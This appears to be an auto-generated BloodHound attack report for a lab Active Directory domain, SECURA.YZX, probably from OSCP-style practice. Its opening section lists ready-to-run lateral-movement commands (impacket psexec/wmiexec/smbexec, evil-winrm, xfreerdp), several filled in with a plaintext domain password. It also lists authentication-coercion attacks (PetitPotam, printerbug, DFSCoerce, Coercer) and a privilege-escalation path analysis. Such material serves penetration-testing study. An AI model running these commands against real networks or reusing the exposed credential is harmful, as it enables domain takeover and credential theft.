# BloodHound Enhanced Report

**Generated:** 2025-12-13 11:28:32

---

## Data Inventory

**Domains:** SECURA.YZX

| Type | Count | Details |
|------|-------|---------|
| Users | 9 | 4 enabled |
| Computers | 4 | DC01.SECURA.YZX, ERA.SECURA.YZX, SECURE |
| Groups | 63 | ACCOUNT OPERATORS@SECURA.YZX, ADMINISTRATORS@SECURA.YZX, BACKUP OPERATORS@SECURA.YZX |

**Relationships:** WriteDacl: 503 | GenericAll: 360 | MemberOf: 43 | DCSync: 5 | AdminTo: 3 | CanPSRemote: 2 | CanRDP: 1

## Attack Commands

## Attack Commands

### Quick Wins

### Rubeus - Monitor for TGTs (Unconstrained Delegation) 

**Objective:** Monitor for incoming TGTs on unconstrained delegation host
**Rewards:** Unconstrained delegation - monitor for TGT capture
**Template:** `Rubeus.exe monitor /interval:5 /nowrap /targetuser:<TARGET_USER>`
**Example:** `Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC01$`
**Need:** <TARGET_USER>
**Requires:** Local admin on unconstrained delegation host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
|  | DC01.SECURA.YZX |  | Unconstrained delegation - monitor for TGT capture | `Rubeus.exe monitor /interval:5 /nowrap /targetuser:<TARGET_USER>` |

### Impacket PSExec - Remote Command Execution 

**Objective:** Execute commands on remote Windows system via SMB + MSRPC. Creates Windows service, provides interactive shell. Most versatile Impacket execution tool.
**Rewards:** Pivot through machine to harvest DA credentials
**Template:** `impacket-psexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'`
**Example:** `impacket-psexec 'corp.com/administrator:P@ssw0rd!@192.168.50.75'`
**Need:** <PASSWORD>
**Requires:** Owned user with AdminTo on pivot

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| ERIC.WALLOWS@SECURA.YZX | SECURE.SECURA.YZX |  | Pivot through machine to harvest DA credentials | `impacket-psexec 'secura.yzx/ERIC.WALLOWS:EricLikesRunning800@192.168.179.95'` |

### Evil-WinRM - PowerShell Remoting 

**Objective:** Connect to Windows via WinRM for PowerShell access
**Rewards:** Pivot through machine to harvest DA credentials
**Template:** `evil-winrm -i <TARGET> -u <USER> -p <PASSWORD>`
**Example:** `evil-winrm -i 192.168.1.10 -u administrator -p Password123`
**Need:** <PASSWORD>
**Requires:** Owned user with AdminTo on pivot

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| ERIC.WALLOWS@SECURA.YZX | SECURE.SECURA.YZX |  | Pivot through machine to harvest DA credentials | `evil-winrm -i 192.168.179.95 -u ERIC.WALLOWS -p EricLikesRunning800` |

### Lateral Movement

### Impacket PSExec - Remote Command Execution [AdminTo]

**Objective:** Execute commands on remote Windows system via SMB + MSRPC. Creates Windows service, provides interactive shell. Most versatile Impacket execution tool.
**Rewards:** SYSTEM shell for credential dumping, persistence, and pivoting
**Template:** `impacket-psexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'`
**Example:** `impacket-psexec 'corp.com/administrator:P@ssw0rd!@192.168.50.75'`
**Need:** <PASSWORD>
**Requires:** Local admin on target (AdminTo edge)

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| ERIC.WALLOWS@SECURA.YZX | SECURE.SECURA.YZX |  | ERIC.WALLOWS has local admin rights on SECURE | `impacket-psexec 'secura.yzx/ERIC.WALLOWS:EricLikesRunning800@192.168.179.95'` |

### Impacket WMIExec - WMI Remote Execution [AdminTo]

**Objective:** Execute commands remotely via Windows Management Instrumentation (WMI). Fileless, serviceless, stealthiest Impacket execution method. Uses DCOM on port 135 + ephemeral RPC.
**Rewards:** SYSTEM shell for credential dumping, persistence, and pivoting
**Template:** `impacket-wmiexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'`
**Example:** `impacket-wmiexec 'corp.com/administrator:P@ssw0rd!@192.168.50.75'`
**Need:** <PASSWORD>
**Requires:** Local admin on target (AdminTo edge)

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| ERIC.WALLOWS@SECURA.YZX | SECURE.SECURA.YZX |  | ERIC.WALLOWS has local admin rights on SECURE | `impacket-wmiexec 'secura.yzx/ERIC.WALLOWS:EricLikesRunning800@192.168.179.95'` |

### Impacket SMBExec - Fileless Remote Execution [AdminTo]

**Objective:** Execute commands remotely via SMB service creation. Fileless alternative to psexec - creates service but no executable written to disk. Better AV evasion.
**Rewards:** SYSTEM shell for credential dumping, persistence, and pivoting
**Template:** `impacket-smbexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'`
**Example:** `impacket-smbexec 'corp.com/administrator:P@ssw0rd!@192.168.50.75'`
**Need:** <PASSWORD>
**Requires:** Local admin on target (AdminTo edge)

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| ERIC.WALLOWS@SECURA.YZX | SECURE.SECURA.YZX |  | ERIC.WALLOWS has local admin rights on SECURE | `impacket-smbexec 'secura.yzx/ERIC.WALLOWS:EricLikesRunning800@192.168.179.95'` |

### Impacket PSExec - Remote Command Execution [AdminTo]

**Objective:** Execute commands on remote Windows system via SMB + MSRPC. Creates Windows service, provides interactive shell. Most versatile Impacket execution tool.
**Rewards:** SYSTEM shell for credential dumping, persistence, and pivoting
**Template:** `impacket-psexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'`
**Example:** `impacket-psexec 'corp.com/administrator:P@ssw0rd!@192.168.50.75'`
**Need:** <PASSWORD>
**Requires:** Local admin on target (AdminTo edge)

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| ERIC.WALLOWS@SECURA.YZX | SECURE.SECURA.YZX |  | ERIC.WALLOWS has local admin rights on SECURE | `impacket-psexec 'secura.yzx/ERIC.WALLOWS:EricLikesRunning800@192.168.179.95'` |

### Evil-WinRM - PowerShell Remoting [CanPSRemote]

**Objective:** Connect to Windows via WinRM for PowerShell access
**Rewards:** PowerShell remoting for stealthy command execution
**Template:** `evil-winrm -i <TARGET> -u <USER> -p <PASSWORD>`
**Example:** `evil-winrm -i 192.168.1.10 -u administrator -p Password123`
**Need:** <PASSWORD>
**Requires:** Remote Management Users or Administrators group

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| CHARLOTTE@SECURA.YZX | DC01.SECURA.YZX |  | CHARLOTTE has PSRemote/WinRM access to DC01 | `evil-winrm -i 192.168.179.97 -u CHARLOTTE -p <PASSWORD>` |
| ERIC.WALLOWS@SECURA.YZX | SECURE.SECURA.YZX |  | ERIC.WALLOWS has PSRemote/WinRM access to SECURE | `evil-winrm -i 192.168.179.95 -u ERIC.WALLOWS -p EricLikesRunning800` |

### xFreeRDP Connection [CanRDP]

**Objective:** Connect to Windows RDP server with xFreeRDP - supports clipboard sharing and certificate bypass
**Rewards:** Interactive desktop access for GUI tools and credential theft
**Template:** `xfreerdp /v:<TARGET>:<PORT> /u:<USERNAME> /p:<PASSWORD> /cert-ignore +clipboard`
**Example:** `xfreerdp /v:192.168.50.63:3389 /u:rdp_admin /p:P@ssw0rd! /cert-ignore +clipboard`
**Need:** <PASSWORD>
**Requires:** Remote Desktop Users or Administrators group

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| ERIC.WALLOWS@SECURA.YZX | SECURE.SECURA.YZX |  | ERIC.WALLOWS has RDP access to SECURE | `xfreerdp /v:192.168.179.95:<PORT> /u:ERIC.WALLOWS /p:EricLikesRunning800 /cert-ignore +clipboard` |

### PetitPotam - Coerce NTLM Authentication [CoerceToTGT]

**Objective:** Force target machine to authenticate to attacker using EfsRpcOpenFileRaw
**Rewards:** Coerce authentication to capture TGT
**Template:** `python3 PetitPotam.py -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' <LISTENER_IP> <TARGET_IP>`
**Example:** `python3 PetitPotam.py -u 'user' -p '<PASSWORD>' -d 'corp.local' 192.168.50.100 192.168.50.70`
**Need:** <PASSWORD>
**Requires:** Network access to target + listener on unconstrained host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| DC01.SECURA.YZX | SECURA.YZX |  | DC01.SECURA.YZX can coerce SECURA auth to capture TGT | `python3 PetitPotam.py -u '<USERNAME>' -p '<PASSWORD>' -d 'secura.yzx' 192.168.179.97 SECURA.YZX` |

### Coercer - Multi-Protocol Authentication Coercion [CoerceToTGT]

**Objective:** Test multiple coercion methods (MS-RPRN, MS-EFSR, MS-FSRVP, etc.)
**Rewards:** Coerce authentication to capture TGT
**Template:** `coercer coerce -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -l <LISTENER_IP> -t <TARGET_IP>`
**Example:** `coercer coerce -u 'user' -p '<PASSWORD>' -d 'corp.local' -l 192.168.50.100 -t 192.168.50.70`
**Need:** <PASSWORD>
**Requires:** Network access to target + listener on unconstrained host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| DC01.SECURA.YZX | SECURA.YZX |  | DC01.SECURA.YZX can coerce SECURA auth to capture TGT | `coercer coerce -u '<USERNAME>' -p '<PASSWORD>' -d 'secura.yzx' -l 192.168.179.97 -t SECURA.YZX` |

### PrinterBug/SpoolSample - Trigger Print Spooler Coercion [CoerceToTGT]

**Objective:** Force target to authenticate using MS-RPRN (Print Spooler)
**Rewards:** Coerce authentication to capture TGT
**Template:** `python3 printerbug.py '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>' <LISTENER_IP>`
**Example:** `python3 printerbug.py 'corp.local/user:<PASSWORD>@192.168.50.70' 192.168.50.100`
**Need:** <PASSWORD>
**Requires:** Network access to target + listener on unconstrained host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| DC01.SECURA.YZX | SECURA.YZX |  | DC01.SECURA.YZX can coerce SECURA auth to capture TGT | `python3 printerbug.py 'secura.yzx/<USERNAME>:<PASSWORD>@SECURA.YZX' 192.168.179.97` |

### DFSCoerce - Trigger DFS Coercion [CoerceToTGT]

**Objective:** Force target to authenticate using MS-DFSNM (DFS)
**Rewards:** Coerce authentication to capture TGT
**Template:** `python3 dfscoerce.py -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' <LISTENER_IP> <TARGET_IP>`
**Example:** `python3 dfscoerce.py -u 'user' -p '<PASSWORD>' -d 'corp.local' 192.168.50.100 192.168.50.70`
**Need:** <PASSWORD>
**Requires:** Network access to target + listener on unconstrained host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| DC01.SECURA.YZX | SECURA.YZX |  | DC01.SECURA.YZX can coerce SECURA auth to capture TGT | `python3 dfscoerce.py -u '<USERNAME>' -p '<PASSWORD>' -d 'secura.yzx' 192.168.179.97 SECURA.YZX` |

---

## Quick Wins

### ⚪ AS-REP Roastable Users
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ Kerberoastable Service Accounts
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ High-Value Kerberoastable (Privileged + SPN)
**OSCP Relevance:** HIGH | **Results:** None

### ✅ Unconstrained Delegation Systems
**OSCP Relevance:** HIGH | **Results:** 1

> Find computers with unconstrained delegation enabled. These can be abused to capture TGTs from authenticating users (printer bug, coercion attacks).

| Computer | ComputerIP | OS | Description |
| --- | --- | --- | --- |
| DC01.SECURA.YZX | 192.168.179.97 | WINDOWS SERVER 2016 STANDARD |  |

### ⚪ Constrained Delegation Principals
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ Users with Passwords in Description
**OSCP Relevance:** HIGH | **Results:** None

### ✅ Accounts with Password Never Expires
**OSCP Relevance:** MEDIUM | **Results:** 4

> Find accounts with non-expiring passwords. Often service accounts with weak passwords or credentials in documentation.

| User | IsPrivileged | Description |
| --- | --- | --- |
| ADMINISTRATOR@SECURA.YZX | True | Built-in account for administering the computer/domain |
| CHARLOTTE@SECURA.YZX | True |  |
| ERIC.WALLOWS@SECURA.YZX | False |  |
| MICHAEL@SECURA.YZX | False |  |

### ✅ Accounts That Never Logged In
**OSCP Relevance:** MEDIUM | **Results:** 3

> Find accounts that have never logged in. May have default or documented passwords.

| User | Description | Created |
| --- | --- | --- |
| ERIC.WALLOWS@SECURA.YZX |  | 1736537198.0 |
| CHARLOTTE@SECURA.YZX |  | 1659724670.0 |
| MICHAEL@SECURA.YZX |  | 1659724583.0 |

### ✅ Computers Without LAPS
**OSCP Relevance:** MEDIUM | **Results:** 2

> Find computers that don't have LAPS deployed. Local admin passwords may be reused or weak.

| Computer | ComputerIP | OS |
| --- | --- | --- |
| ERA.SECURA.YZX | 192.168.179.96 | WINDOWS 10 PRO |
| SECURE.SECURA.YZX | 192.168.179.95 | WINDOWS 10 PRO |

### ✅ Pre-Windows 2000 Compatible Access Accounts
**OSCP Relevance:** LOW | **Results:** 11

> Find computers in Pre-Windows 2000 Compatible Access group. Legacy compatibility may expose vulnerabilities.

| Member | Type | ViaGroup |
| --- | --- | --- |
| AUTHENTICATED USERS@SECURA.YZX | ['Group', 'Base'] | PRE-WINDOWS 2000 COMPATIBLE ACCESS@SECURA.YZX |
| DOMAIN COMPUTERS@SECURA.YZX | ['Group', 'Base'] | AUTHENTICATED USERS@SECURA.YZX |
| DOMAIN USERS@SECURA.YZX | ['Group', 'Base'] | AUTHENTICATED USERS@SECURA.YZX |
| DEFAULTACCOUNT@SECURA.YZX | ['User', 'Base'] | DOMAIN USERS@SECURA.YZX |
| MICHAEL@SECURA.YZX | ['User', 'Base'] | DOMAIN USERS@SECURA.YZX |
| ERIC.WALLOWS@SECURA.YZX | ['User', 'Base'] | DOMAIN USERS@SECURA.YZX |
| CHARLOTTE@SECURA.YZX | ['User', 'Base'] | DOMAIN USERS@SECURA.YZX |
| ADMINISTRATOR@SECURA.YZX | ['User', 'Base', 'Tag_Tier_Zero'] | DOMAIN USERS@SECURA.YZX |
| KRBTGT@SECURA.YZX | ['User', 'Base', 'Tag_Tier_Zero'] | DOMAIN USERS@SECURA.YZX |
| SECURE.SECURA.YZX | ['Computer', 'Base'] | DOMAIN COMPUTERS@SECURA.YZX |
| ERA.SECURA.YZX | ['Computer', 'Base'] | DOMAIN COMPUTERS@SECURA.YZX |

### ⚪ ReadGMSAPassword Rights
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ ReadLAPSPassword Rights
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ All gMSA Accounts
**OSCP Relevance:** HIGH | **Results:** None

---

## Lateral Movement

### ✅ Non-DA Users with Local Admin on Workstations
**OSCP Relevance:** HIGH | **Results:** 1

> Find non-privileged users with local admin rights on workstations (not DCs). KEY QUERY from DCSync capstone - discovered MIKE->CLIENT75 attack path. These are prime lateral movement targets.

| User | AdminOnComputers | AdminOnIPs | ComputerCount |
| --- | --- | --- | --- |
| ERIC.WALLOWS@SECURA.YZX | ['SECURE.SECURA.YZX'] | ['192.168.179.95'] | 1 |

### ✅ All Local Admins per Computer
**OSCP Relevance:** HIGH | **Results:** 1

> Enumerate all principals (users, groups) with local admin rights on each computer. Useful for identifying high-value targets with many admin paths.

| Computer | ComputerIP | LocalAdmins | AdminCount |
| --- | --- | --- | --- |
| SECURE.SECURA.YZX | 192.168.179.95 | ['ERIC.WALLOWS@SECURA.YZX', 'DOMAIN ADMINS@SECURA.YZX'] | 2 |

### ✅ PSRemote Access (Evil-WinRM Targets)
**OSCP Relevance:** HIGH | **Results:** 2

> Find users with PowerShell Remoting access to computers. These are Evil-WinRM targets for lateral movement.

| User | PSRemoteTargets | PSRemoteIPs | TargetCount |
| --- | --- | --- | --- |
| CHARLOTTE@SECURA.YZX | ['DC01.SECURA.YZX'] | ['192.168.179.97'] | 1 |
| ERIC.WALLOWS@SECURA.YZX | ['SECURE.SECURA.YZX'] | ['192.168.179.95'] | 1 |

### ✅ RDP Access Targets
**OSCP Relevance:** HIGH | **Results:** 1

> Find users with Remote Desktop access to computers. RDP provides interactive access for credential harvesting.

| User | RDPTargets | RDPIPs | TargetCount |
| --- | --- | --- | --- |
| ERIC.WALLOWS@SECURA.YZX | ['SECURE.SECURA.YZX'] | ['192.168.179.95'] | 1 |

### ⚪ DCOM Execution Rights
**OSCP Relevance:** MEDIUM | **Results:** None

### Sessions on Specific Computer
*Skipped - requires variables: COMPUTER*

### All Computer Access for Specific User
*Skipped - requires variables: USER*

### All Users Who Can Access Specific Computer
*Skipped - requires variables: COMPUTER*

### ⚪ Computers Where Domain Users Are Local Admin
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ Computers with Multiple Admin Paths
**OSCP Relevance:** MEDIUM | **Results:** None

### ⚪ Workstations with Domain Admin Sessions
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ Cross-Trust Lateral Movement
**OSCP Relevance:** MEDIUM | **Results:** None

### ✅ Coercion Targets (Unconstrained Delegation)
**OSCP Relevance:** HIGH | **Results:** 1

> Find computers with unconstrained delegation that can capture TGTs via coercion attacks (PetitPotam, PrinterBug, DFSCoerce). Coerce a DC to authenticate to these systems to capture its TGT.

| CoercionHost | CoercionHostIP | OS | CanCaptureTGTFrom | TargetType |
| --- | --- | --- | --- | --- |
| DC01.SECURA.YZX | 192.168.179.97 | WINDOWS SERVER 2016 STANDARD | SECURA.YZX | ['Base', 'Domain', 'Tag_Tier_Zero'] |

### ⚪ SID History Abuse Paths
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ Domain Trust Relationships
**OSCP Relevance:** HIGH | **Results:** None

---

## Privilege Escalation

### ✅ DCSync Rights
**OSCP Relevance:** HIGH | **Results:** 6

> Find principals with DCSync rights (GetChanges + GetChangesAll on Domain). Can perform secretsdump.py to extract all domain hashes.

| Principal | Type | Right |
| --- | --- | --- |
| ADMINISTRATORS@SECURA.YZX | ['ADLocalGroup', 'Group', 'Base', 'Tag_Tier_Zero'] | GetChanges |
| ENTERPRISE DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] | GetChanges |
| ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base'] | GetChanges |
| ADMINISTRATORS@SECURA.YZX | ['ADLocalGroup', 'Group', 'Base', 'Tag_Tier_Zero'] | GetChangesAll |
| DOMAIN CONTROLLERS@SECURA.YZX | ['Base', 'OU', 'Tag_Tier_Zero'] | GetChangesAll |
| DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] | GetChangesAll |

### ✅ GenericAll on High-Value Targets
**OSCP Relevance:** HIGH | **Results:** 32

> Find principals with GenericAll (full control) over privileged users, groups, or computers. Can reset passwords, modify group memberships, etc.

| Attacker | Victim | VictimType |
| --- | --- | --- |
| ENTERPRISE ADMINS@SECURA.YZX | DOMAIN CONTROLLERS@SECURA.YZX | ['Base', 'OU', 'Tag_Tier_Zero'] |
| ACCOUNT OPERATORS@SECURA.YZX | HYPER-V ADMINISTRATORS@SECURA.YZX | ['Group', 'Base'] |
| DOMAIN ADMINS@SECURA.YZX | HYPER-V ADMINISTRATORS@SECURA.YZX | ['Group', 'Base'] |
| ENTERPRISE ADMINS@SECURA.YZX | HYPER-V ADMINISTRATORS@SECURA.YZX | ['Group', 'Base'] |
| ACCOUNT OPERATORS@SECURA.YZX | STORAGE REPLICA ADMINISTRATORS@SECURA.YZX | ['Group', 'Base'] |
| DOMAIN ADMINS@SECURA.YZX | STORAGE REPLICA ADMINISTRATORS@SECURA.YZX | ['Group', 'Base'] |
| ENTERPRISE ADMINS@SECURA.YZX | STORAGE REPLICA ADMINISTRATORS@SECURA.YZX | ['Group', 'Base'] |
| ACCOUNT OPERATORS@SECURA.YZX | DNSADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | DNSADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | DNSADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ACCOUNT OPERATORS@SECURA.YZX | DOMAIN COMPUTERS@SECURA.YZX | ['Group', 'Base'] |
| DOMAIN ADMINS@SECURA.YZX | DOMAIN COMPUTERS@SECURA.YZX | ['Group', 'Base'] |
| ENTERPRISE ADMINS@SECURA.YZX | DOMAIN COMPUTERS@SECURA.YZX | ['Group', 'Base'] |
| ACCOUNT OPERATORS@SECURA.YZX | DOMAIN USERS@SECURA.YZX | ['Group', 'Base'] |
| DOMAIN ADMINS@SECURA.YZX | DOMAIN USERS@SECURA.YZX | ['Group', 'Base'] |
| ENTERPRISE ADMINS@SECURA.YZX | DOMAIN USERS@SECURA.YZX | ['Group', 'Base'] |
| ACCOUNT OPERATORS@SECURA.YZX | DOMAIN GUESTS@SECURA.YZX | ['Group', 'Base'] |
| DOMAIN ADMINS@SECURA.YZX | DOMAIN GUESTS@SECURA.YZX | ['Group', 'Base'] |
| ENTERPRISE ADMINS@SECURA.YZX | DOMAIN GUESTS@SECURA.YZX | ['Group', 'Base'] |
| ACCOUNT OPERATORS@SECURA.YZX | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base'] |
| DOMAIN ADMINS@SECURA.YZX | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base'] |
| ENTERPRISE ADMINS@SECURA.YZX | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base'] |
| ACCOUNT OPERATORS@SECURA.YZX | CLONEABLE DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base'] |
| DOMAIN ADMINS@SECURA.YZX | CLONEABLE DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base'] |
| ENTERPRISE ADMINS@SECURA.YZX | CLONEABLE DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base'] |
| ACCOUNT OPERATORS@SECURA.YZX | KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ACCOUNT OPERATORS@SECURA.YZX | ENTERPRISE KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | ENTERPRISE KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | ENTERPRISE KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |

### ⚪ Shadow Admins (Control over DA Users)
**OSCP Relevance:** HIGH | **Results:** None

### ✅ WriteDacl Abuse Paths
**OSCP Relevance:** HIGH | **Results:** 63

> Find principals with WriteDacl on high-value targets. Can grant themselves GenericAll then escalate further.

| Attacker | Victim | VictimType |
| --- | --- | --- |
| ADMINISTRATORS@SECURA.YZX | HYPER-V ADMINISTRATORS@SECURA.YZX | ['Group', 'Base'] |
| ADMINISTRATORS@SECURA.YZX | STORAGE REPLICA ADMINISTRATORS@SECURA.YZX | ['Group', 'Base'] |
| ADMINISTRATORS@SECURA.YZX | SERVER OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | SERVER OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | SERVER OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | ACCOUNT OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | ACCOUNT OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | ACCOUNT OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | DNSADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | DOMAIN COMPUTERS@SECURA.YZX | ['Group', 'Base'] |
| ADMINISTRATORS@SECURA.YZX | DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | DOMAIN USERS@SECURA.YZX | ['Group', 'Base'] |
| ADMINISTRATORS@SECURA.YZX | DOMAIN GUESTS@SECURA.YZX | ['Group', 'Base'] |
| ADMINISTRATORS@SECURA.YZX | READ-ONLY DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base'] |
| DOMAIN ADMINS@SECURA.YZX | READ-ONLY DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base'] |
| ENTERPRISE ADMINS@SECURA.YZX | READ-ONLY DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base'] |
| ADMINISTRATORS@SECURA.YZX | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base'] |
| ADMINISTRATORS@SECURA.YZX | CLONEABLE DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base'] |
| ADMINISTRATORS@SECURA.YZX | KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | ENTERPRISE KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | SCHEMA ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | SCHEMA ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | SCHEMA ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | ENTERPRISE ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | ENTERPRISE ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | DOMAIN ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | DOMAIN ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | ADMINISTRATORS@SECURA.YZX | ['ADLocalGroup', 'Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | ADMINISTRATORS@SECURA.YZX | ['ADLocalGroup', 'Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | PRINT OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | PRINT OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | PRINT OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | BACKUP OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | BACKUP OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | BACKUP OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | REPLICATOR@SECURA.YZX | ['Group', 'Base'] |
| DOMAIN ADMINS@SECURA.YZX | REPLICATOR@SECURA.YZX | ['Group', 'Base'] |
| ENTERPRISE ADMINS@SECURA.YZX | REPLICATOR@SECURA.YZX | ['Group', 'Base'] |
| ADMINISTRATORS@SECURA.YZX | ADMINSDHOLDER@SECURA.YZX | ['Base', 'Container', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | ADMINSDHOLDER@SECURA.YZX | ['Base', 'Container', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | ADMINSDHOLDER@SECURA.YZX | ['Base', 'Container', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | ADMINISTRATOR@SECURA.YZX | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | ADMINISTRATOR@SECURA.YZX | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | ADMINISTRATOR@SECURA.YZX | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | KRBTGT@SECURA.YZX | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | KRBTGT@SECURA.YZX | ['User', 'Base', 'Tag_Tier_Zero'] |
